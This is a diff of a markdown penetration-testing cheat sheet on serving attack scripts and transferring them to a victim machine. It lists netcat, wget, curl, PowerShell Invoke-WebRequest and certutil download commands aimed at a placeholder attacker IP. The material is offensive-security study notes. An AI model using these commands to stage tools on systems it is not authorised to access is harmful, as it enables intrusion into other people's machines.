@@ -6,12 +6,12 @@
 
 #### Apache2
 
-- Copy scripts to `/var/www/html`
-- `sudo systemctl start apache2`
+> - Copy scripts to `/var/www/html`
+> - `sudo systemctl start apache2`
 
 #### SimpleHTTPServer
 
-- `python -m SimpleHTTPServer <port>`
+> - `python -m SimpleHTTPServer <port>`
 
 ### Download Scripts:
 
@@ -19,17 +19,17 @@
 
 #### Without Server:
 
-- Victim: `nc -nvlp <port> > <script>`
-- Attacker: `nc -nv <ip> <port> < <script>`
+> - Victim: `nc -nvlp <port> > <script>`
+> - Attacker: `nc -nv <ip> <port> < <script>`
 
 #### With Server:
 
-- `wget http://<ip>/<script>`
-- `curl http://<ip>/<script> -o <script>`
+> - `wget http://<ip>/<script>`
+> - `curl http://<ip>/<script> -o <script>`
 
 #### Windows
 
 #### With Server:
 
-- `Invoke-WebRequest http://<ip>/<script> -OutFile <script>`
-- `certutil.exe -urlcache -split -f "http://<ip>/<script>" <script>`
+> - `Invoke-WebRequest http://<ip>/<script> -OutFile <script>`
+> - `certutil.exe -urlcache -split -f "http://<ip>/<script>" <script>`
